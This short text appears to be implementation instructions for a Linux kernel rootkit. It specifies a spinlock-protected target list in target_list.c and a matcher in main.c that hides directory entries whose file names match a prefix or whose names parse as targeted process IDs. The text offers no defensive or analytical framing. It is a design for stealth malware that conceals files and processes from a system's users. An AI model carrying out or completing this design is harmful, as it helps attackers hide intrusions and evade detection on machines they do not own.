For target_list.c: every function that touches list->entries or list->count must
be wrapped in spin_lock_irqsave/spin_unlock_irqrestore.
The add function copies the string with strscpy and returns the index.
The remove function compacts by shifting entries down with memcpy.

For the matcher in main.c: call rk_target_prefix_match for file names.
For PID hiding, parse the dirent name with kstrtouint and check
rk_target_number_match.
Return true from either path to hide the entry.
